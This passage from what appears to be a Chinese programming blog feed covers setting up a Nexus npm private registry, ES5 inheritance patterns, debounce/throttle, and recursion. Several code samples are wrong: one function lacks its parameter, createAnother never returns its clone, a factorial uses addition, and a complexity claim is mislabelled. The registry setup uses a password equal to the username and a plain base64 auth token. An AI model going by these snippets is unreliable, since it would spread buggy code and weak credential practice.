<h4 id="3-选择-npm-group-进入并填写字段"><a href="#3-选择-npm-group-进入并填写字段" class="headerlink" title="3. 选择 npm(group) 进入并填写字段:"></a>3. 选择 npm(group) 进入并填写字段:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Name: npm-group // 用于存放私有包</span><br></pre></td></tr></table></figure>
<ul>
<li>在 Member repositories 选项中添加 npm-proxy 和 npm-hosted</li>
<li>点击保存</li>
</ul>
<h2 id="配置并验证-npm-仓库"><a href="#配置并验证-npm-仓库" class="headerlink" title="配置并验证 npm 仓库"></a>配置并验证 npm 仓库</h2><h4 id="1-设置-npm-仓库地址："><a href="#1-设置-npm-仓库地址：" class="headerlink" title="1. 设置 npm 仓库地址："></a>1. 设置 npm 仓库地址：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// ip 自选</span><br><span class="line">npm config set registry http://localhost:8081/repository/npm-group/</span><br></pre></td></tr></table></figure>
<h4 id="2-查看-npm-仓库地址是否设置成功："><a href="#2-查看-npm-仓库地址是否设置成功：" class="headerlink" title="2. 查看 npm 仓库地址是否设置成功："></a>2. 查看 npm 仓库地址是否设置成功：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config get registry</span><br><span class="line">// http://127.0.0.1:8081/repository/npm-group/</span><br></pre></td></tr></table></figure>
<h4 id="3-在任意项目路径下初始化："><a href="#3-在任意项目路径下初始化：" class="headerlink" title="3. 在任意项目路径下初始化："></a>3. 在任意项目路径下初始化：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init -y</span><br></pre></td></tr></table></figure>
<p>执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm --loglevel info install jquery</span><br></pre></td></tr></table></figure></p>
<ul>
<li>安装信息中可查看请求地址是否私服，如：<code>fetch 200 http://localhost:8081/repository/npm-group/jquery/-/jquery-3.4.1.tgz</code></li>
<li>查看 <a href="http://127.0.0.1:8081/#browse/search/npm" target="_blank" rel="noopener">http://127.0.0.1:8081/#browse/search/npm</a> 路由。最初搭建私服里的包内容为空，然后通过私服安装依赖包后就会被缓存下来，下次请求时就不会请求外网地址了。</li>
</ul>
<h2 id="发布包到私服"><a href="#发布包到私服" class="headerlink" title="发布包到私服"></a>发布包到私服</h2><h4 id="1-设置发布权限："><a href="#1-设置发布权限：" class="headerlink" title="1. 设置发布权限："></a>1. 设置发布权限：</h4><ul>
<li>在 Security-Realms 界面中 <code>npm Bearer Token Realm</code> 添加到右侧 Active 框。</li>
<li>点击保存</li>
</ul>
<h4 id="2-在-Security-Roles-界面中创建角色："><a href="#2-在-Security-Roles-界面中创建角色：" class="headerlink" title="2. 在 Security-Roles 界面中创建角色："></a>2. 在 Security-Roles 界面中创建角色：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Role ID: nx-deploy</span><br><span class="line">Role name: nx-deploy</span><br></pre></td></tr></table></figure>
<ul>
<li>在 Given 框下给角色赋添加 <code>nx-repository-view-*-*-*</code> 权限</li>
<li>点击保存</li>
</ul>
<h4 id="3-Security-Users-界面中创建用户："><a href="#3-Security-Users-界面中创建用户：" class="headerlink" title="3. Security-Users 界面中创建用户："></a>3. Security-Users 界面中创建用户：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: fuzhongfeng // ID 为发布客户端 npm 中的 username 字段</span><br><span class="line">Password: fuzhongfeng</span><br><span class="line">Email: 337925234@qq.com</span><br></pre></td></tr></table></figure>
<ul>
<li>在 granted 选项中将用户设置为上一步骤中添加的 nx-deploy 角色</li>
<li>注意这里的用户名和密码和邮箱在发布包到私服时会用到</li>
</ul>
<h4 id="4-配置包资源中的-package-json"><a href="#4-配置包资源中的-package-json" class="headerlink" title="4. 配置包资源中的 package.json"></a>4. 配置包资源中的 package.json</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;publishConfig&quot; : &#123;</span><br><span class="line">    &quot;registry&quot; : &quot;http://localhost:8081/repository/npm-hosted/&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意这里的库为 npm-hosted</li>
</ul>
<h4 id="5-生成-npmrc-文件中的-auth-字段-（用于配置发布权限）"><a href="#5-生成-npmrc-文件中的-auth-字段-（用于配置发布权限）" class="headerlink" title="5. 生成 .npmrc 文件中的 _auth 字段:（用于配置发布权限）"></a>5. 生成 .npmrc 文件中的 _auth 字段:（用于配置发布权限）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n &apos;username:password&apos; | openssl base64</span><br><span class="line">// username 和 password 分别为第三步新建user时的用户名和密码，这里为`fuzhongfeng`</span><br></pre></td></tr></table></figure>
<h4 id="6-客户端配置-npm-发布权限："><a href="#6-客户端配置-npm-发布权限：" class="headerlink" title="6. 客户端配置 npm 发布权限："></a>6. 客户端配置 npm 发布权限：</h4><ul>
<li><p>查看 npm 的配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config ls -l</span><br></pre></td></tr></table></figure>
</li>
<li><p>找到 userconfig = “/Users/fuzhongfeng/.npmrc” 字段。点击打开 .npmrc 文件添加如下配置并保存：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 这里的 email 为 创建 user 中的字段，_auth 为第五步中生成的base64字符串</span><br><span class="line">registry=http://127.0.0.1:8081/repository/npm-group/</span><br><span class="line">email=337925234@qq.com</span><br><span class="line">always-auth=true</span><br><span class="line">_auth=&quot;ZGVwbG95ZXI6ZGVwbG95ZXI=&quot;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="7-项目根目录下执行："><a href="#7-项目根目录下执行：" class="headerlink" title="7. 项目根目录下执行："></a>7. 项目根目录下执行：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm publish</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> npm </category>
            
        </categories>
        
        
        <tags>
            
            <tag> npm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript-继承]]></title>
      <url>https://fuzhongfeng.github.io/2019/10/07/javascript-extend/</url>
      <content type="html"><![CDATA[<h1 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h1><blockquote>
<p>es5 实现继承的 6 种方式和优缺点，以及继承的最佳方案</p>
</blockquote>
<h2 id="1-原型链"><a href="#1-原型链" class="headerlink" title="1. 原型链"></a>1. 原型链</h2><ul>
<li><p>实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function Super() &#123;</span><br><span class="line">    this.property = true</span><br><span class="line">&#125;</span><br><span class="line">Super.prototype.getSuperValue = function() &#123;</span><br><span class="line">    return this.property</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Sub()&#123;</span><br><span class="line">    this.subProperty = false</span><br><span class="line">&#125;</span><br><span class="line">Sub.prototype = new Super()</span><br><span class="line"></span><br><span class="line">// 替换原型后添加新方法</span><br><span class="line">Sub.prototype.getSubValue = function() &#123;</span><br><span class="line">    return this.subProperty</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var instance = new Sub()</span><br><span class="line">console.log(instance.getSuperValue()) // true</span><br></pre></td></tr></table></figure>
</li>
<li><p>原型链的问题: </p>
</li>
</ul>
<ol>
<li><p>包含引用类型值的原型属性会被所有实例共享</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function Super() &#123;</span><br><span class="line">    this.colors = [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;];</span><br><span class="line">    this.num = 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Sub()&#123;</span><br><span class="line">    this.subProperty = false</span><br><span class="line">&#125;</span><br><span class="line">Sub.prototype = new Super()</span><br><span class="line"></span><br><span class="line">var instance1 = new Sub()</span><br><span class="line">instance1.colors.push(&quot;black&quot;)</span><br><span class="line">instance1.num = 111 // 非引用类型属性不会互相影响</span><br><span class="line">console.log(instance1.colors, instance1.num) // [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;, &quot;black&quot;]  111</span><br><span class="line"></span><br><span class="line">var instance2 = new Sub()</span><br><span class="line">console.log(instance2.colors, instance2.num) // [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;, &quot;black&quot;] 1</span><br></pre></td></tr></table></figure>
</li>
<li><p>无法在不影响所有实例的情况下，给父类的构造函数传递参数</p>
</li>
</ol>
<h2 id="借用构造函数"><a href="#借用构造函数" class="headerlink" title="借用构造函数"></a>借用构造函数</h2><p>通过借用构造函数，可以解决原型中包含引用类型值所带来的问题。即<br>在子类构造函数的内部调用父类型构造函数</p>
<ul>
<li><p>实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function Super(name)&#123;</span><br><span class="line">    this.name = name</span><br><span class="line">    this.colors = [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Sub()&#123;</span><br><span class="line">    //继承了 Super</span><br><span class="line">    Super.call(this, &apos;fuzhongfeng&apos;)</span><br><span class="line">    this.age = 29</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var instance1 = new Sub()</span><br><span class="line">var instance2 = new Sub()</span><br><span class="line">instance1.colors.push(&quot;black&quot;);</span><br><span class="line">console.log(instance1.name, instance1.age) // &apos;fuzhongfeng&apos; 29</span><br><span class="line">console.log(instance1.colors);    //&quot;red,blue,green,black&quot;</span><br><span class="line">console.log(instance2.colors);    //&quot;red,blue,green&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>借用构造函数的问题: </p>
</li>
</ul>
<ol>
<li>方法都在构造函数中定义，因此函数不能复用</li>
</ol>
<h2 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h2><p>组合继承，指的是将原型链和借用构造函数的技术组合到一块，从而发挥二者之长的一种继承模式。即使用原型链实现对原型属性和方法的继承，而通过借用构造函数来实现对实例属性的继承</p>
<ul>
<li><p>实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function Super(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.colors = [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">Super.prototype.sayName = function()&#123;</span><br><span class="line">    console.log(this.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Sub(name, age)&#123;</span><br><span class="line">    //继承属性 </span><br><span class="line">    Super.call(this, name);</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Sub.prototype = new Super();</span><br><span class="line">Sub.prototype.constructor = Sub; // constructor 指回自身</span><br><span class="line">Sub.prototype.sayAge = function()&#123;</span><br><span class="line">    console.log(this.age);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var instance1 = new Sub(&quot;fuzhongfeng&quot;, 29);</span><br><span class="line">instance1.colors.push(&quot;black&quot;);</span><br><span class="line">console.log(instance1.colors); // &quot;red,blue,green,black&quot;</span><br><span class="line">instance1.sayName(); // &quot;fuzhongfeng&quot;</span><br><span class="line">instance1.sayAge(); // 29</span><br><span class="line"></span><br><span class="line">var instance2 = new Sub(&quot;Feynman&quot;, 27);</span><br><span class="line">console.log(instance2.colors); // &quot;red,blue,green&quot;</span><br><span class="line">instance2.sayName(); // &quot;Feynman&quot;</span><br><span class="line">instance2.sayAge(); // 27</span><br></pre></td></tr></table></figure>
</li>
<li><p>组合继承的问题：</p>
</li>
</ul>
<ol>
<li>组合继承最大的问题就是无论什么情况下，都会调用两次父类构造函数: 一次是在创建子类原型的时候，另一次是在子类构造函数内部。所以子类的原型上包含父类的实例属性，但在调用子类构造函数时也会包含父类的实例属性。子类实例属性会屏蔽子类原型上的同名属性。</li>
</ol>
<h3 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h3><p>创建了一个临时性的构造函数，然后将传入的对象作为这个构造函数的原型，最后返回了这个临时类型的一个新实例。</p>
<ul>
<li>实现：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// object()对传入其中的对象执行了一次浅复制</span><br><span class="line">function object(o)&#123;</span><br><span class="line">    function F()&#123;&#125;;</span><br><span class="line">    F.prototype = o;</span><br><span class="line">    return new F();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>原生方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object.create()</span><br></pre></td></tr></table></figure></p>
<ul>
<li>原型式继承的问题：<br>包含引用类型值的属性始终都会共享相应的值，就像使用原型模式一样。</li>
</ul>
<h2 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h2><p>创建一个仅用于封装继承过程的函数，该函数在内部以某种方式来增强对象，最后再像真地是它做了所有工作一样返回对象</p>
<ul>
<li><p>实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function createAnother(original)&#123; </span><br><span class="line">    var clone = Object.create(original); // 通过调用函数创建一个新对象</span><br><span class="line">    clone.sayHi = function()&#123;</span><br><span class="line">        console.log(&quot;hi&quot;);</span><br><span class="line">    &#125;;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>寄生式继承的问题：</p>
</li>
</ul>
<ol>
<li>使用寄生式继承来为对象添加函数，会由于不能做到函数复用而降低效率; 这一点与构造函数模式类似。</li>
</ol>
<h2 id="寄生组合式继承-最佳方案！！！"><a href="#寄生组合式继承-最佳方案！！！" class="headerlink" title="寄生组合式继承(最佳方案！！！)"></a>寄生组合式继承(最佳方案！！！)</h2><p>不必为了指定子类的原型而调用超类的构造函数，我们所需要的无非就是超类原型的一个副本而已。本质上，就是使用寄生式继承来继承超类的原型，然后再将结果指定给子类的原型</p>
<ul>
<li>实现：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function inheritPrototype(subType, superType)&#123;</span><br><span class="line">    // var prototype = Object.assign(&#123;&#125;, superType.prototype);</span><br><span class="line">    var prototype = Object.create(superType.prototype);</span><br><span class="line">    prototype.constructor = subType;</span><br><span class="line">    subType.prototype = prototype;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Super(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.colors = [&quot;red&quot;, &quot;blue&quot;, &quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">Super.prototype.sayName = function()&#123;</span><br><span class="line">    console.log(this.name);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function Sub(name, age)&#123;</span><br><span class="line">    Super.call(this, name);</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inheritPrototype(Sub, Super);</span><br><span class="line"></span><br><span class="line">// 调用inheritPrototype后，才能给子类原型上添加函数</span><br><span class="line">Sub.prototype.sayAge = function()&#123;</span><br><span class="line">    console.log(this.age);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="es6-extends-的实现方式"><a href="#es6-extends-的实现方式" class="headerlink" title="es6 extends 的实现方式"></a>es6 extends 的实现方式</h2>]]></content>
      
        <categories>
            
            <category> JavaScript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript-节流和防抖]]></title>
      <url>https://fuzhongfeng.github.io/2019/10/01/2019-10-1-javascript-throttle-debounce/</url>
      <content type="html"><![CDATA[<h2 id="防抖"><a href="#防抖" class="headerlink" title="防抖"></a>防抖</h2><ol>
<li>延迟执行的防抖</li>
</ol>
<ul>
<li><p>如在搜索时希望用户输入结束后再进行接口调用，也就是在一连串时间间隔小于指定时间的函数调用后触发一次。</p>
</li>
<li><p>实现：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var debounce = function(func, wait = 100) &#123;</span><br><span class="line">	var timer = null</span><br><span class="line">	</span><br><span class="line">	return function(...args) &#123;</span><br><span class="line">		timer &amp;&amp;  clearTimeout(timer)</span><br><span class="line">        timer = setTimeout(function() &#123;</span><br><span class="line">            func.apply(this, args)</span><br><span class="line">        &#125;, wait)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">// 使用</span><br><span class="line">function test() &#123;</span><br><span class="line">	console.log(111)</span><br><span class="line">&#125;</span><br><span class="line">var f = debounce(test, 500)</span><br><span class="line">for(var i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">	f()</span><br><span class="line">&#125;</span><br><span class="line">// 111（只输出一次）</span><br></pre></td></tr></table></figure>
</li>
</ul>
<ol start="2">
<li>立即执行的防抖</li>
</ol>
<ul>
<li>我不希望非要等到事件停止触发后才执行，我希望立刻执行函数，然后等到停止触发 n 秒后，才可以重新触发执行。<br>如：点击一个保存按钮时，希望第一次就可以发送请求即立即执行更优，相比于延迟执行体验更好。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">var debounce = function(func, wait, immediate) &#123;</span><br><span class="line">	var timer = null</span><br><span class="line"></span><br><span class="line">	return function (...args) &#123;</span><br><span class="line">        timer &amp;&amp;  clearTimeout(timer)</span><br><span class="line">		if(immediate) &#123;</span><br><span class="line">            var callNow = !timer</span><br><span class="line">			timer = setTimeout(() =&gt; &#123;</span><br><span class="line">                timer = null</span><br><span class="line">            &#125;, wait)</span><br><span class="line">            if (callNow) return func.apply(this, args) // 返回值</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			timer = setTimeout(() =&gt; &#123;</span><br><span class="line">                func.apply(this, args) // 这里的返回值无法取到</span><br><span class="line">			&#125;, wait)</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">// 使用</span><br><span class="line">function test() &#123;</span><br><span class="line">	console.log(111)</span><br><span class="line">&#125;</span><br><span class="line">var f = debounce(test, 2000, true)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="节流"><a href="#节流" class="headerlink" title="节流"></a>节流</h2><ul>
<li>固定间隔执行<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var throttle = function(func, wait = 100) &#123;</span><br><span class="line">  var timer = null;</span><br><span class="line">  </span><br><span class="line">  return function(...arg) &#123;</span><br><span class="line">    if (!timer) &#123;</span><br><span class="line">      timer = setTimeout(() =&gt; &#123;</span><br><span class="line">        timer = null;</span><br><span class="line">        func.apply(this, arg);</span><br><span class="line">      &#125;, wait)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      
        <categories>
            
            <category> JavaScript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript-递归]]></title>
      <url>https://fuzhongfeng.github.io/2019/10/01/2019-10-1-javascript-recursion/</url>
      <content type="html"><![CDATA[<h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><blockquote>
<p>递归函数是在一个函数通过名字调用自身的情况下构成的</p>
</blockquote>
<h3 id="看一个经典的递归阶乘函数"><a href="#看一个经典的递归阶乘函数" class="headerlink" title="看一个经典的递归阶乘函数"></a>看一个经典的递归阶乘函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 复杂度 O(n)</span><br><span class="line">function factorial(num) &#123;</span><br><span class="line">  if (num === 1) &#123;</span><br><span class="line">    return num</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return num * factorial(num - 1)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="递归函数调用自身问题"><a href="#递归函数调用自身问题" class="headerlink" title="递归函数调用自身问题"></a>递归函数调用自身问题</h3><ul>
<li><p>递归调用的函数被重置后会出现问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var anotherFactorial = factorial</span><br><span class="line">factorial = null</span><br><span class="line">anotherFactorial(4) //出错!</span><br></pre></td></tr></table></figure>
</li>
<li><p>arguments.callee 是一个指向正在执行函数的指针，因此可以用它来实现对函数的递归调用。但在严格模式下，不能通过脚本访问 arguments.callee，访问这个属性会导致错误</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function factorial(num) &#123;</span><br><span class="line">  if (num === 1) &#123;</span><br><span class="line">    return num</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">     return num * arguments.callee(num - 1)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用命名函数表达式来达成相同的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var factorial = (function f() &#123;</span><br><span class="line">  if (num === 1) &#123;</span><br><span class="line">    return num</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">     return num * f(num - 1)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>函数f是不对外暴露的，所以执行过程中不会被重置，这种方式在严格模式和 非严格模式下都行得通。</p>
<h3 id="尾递归"><a href="#尾递归" class="headerlink" title="尾递归"></a>尾递归</h3><ul>
<li>尾调用是指函数的最后一步是调用另一个函数。尾调用只保留内层函数的调用记录，可释放掉多余的内存占用。</li>
<li>尾调用自身，就称为尾递归。递归非常耗费内存，很容易发生”栈溢出”错误（stack overflow）。尾调用指保存一个调用记录，所以不会发生栈溢出的问题。</li>
</ul>
<h3 id="利用尾递归重写阶乘函数"><a href="#利用尾递归重写阶乘函数" class="headerlink" title="利用尾递归重写阶乘函数"></a>利用尾递归重写阶乘函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 复杂度 O(1)</span><br><span class="line">function factorial(num, total = 1) &#123;</span><br><span class="line">  if (num === 1) &#123;</span><br><span class="line">    return total</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    total = num * total</span><br><span class="line">    return factorial(num - 1, total)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">factorial(5)</span><br></pre></td></tr></table></figure>
<p>只要函数执行的最后一步为自身函数调用即可。上面例子中的 num * factorial(num - 1) 也不算尾调用，因为一直保存着对 num 的引用。</p>
<h3 id="但浏览器一定会识别尾递归的优化吗？"><a href="#但浏览器一定会识别尾递归的优化吗？" class="headerlink" title="但浏览器一定会识别尾递归的优化吗？"></a>但浏览器一定会识别尾递归的优化吗？</h3><ul>
<li><p>下面在chrome控制台执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 经典阶乘递归函数</span><br><span class="line">function factorial(num) &#123;</span><br><span class="line">  if (num === 1) &#123;</span><br><span class="line">    return num</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    return num + factorial(num - 1)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">factorial(100000)</span><br><span class="line">// 此时栈溢出：Maximum call stack size exceeded</span><br></pre></td></tr></table></figure>
</li>
<li><p>下面再使用尾递归就不会栈溢出了吗？</p>
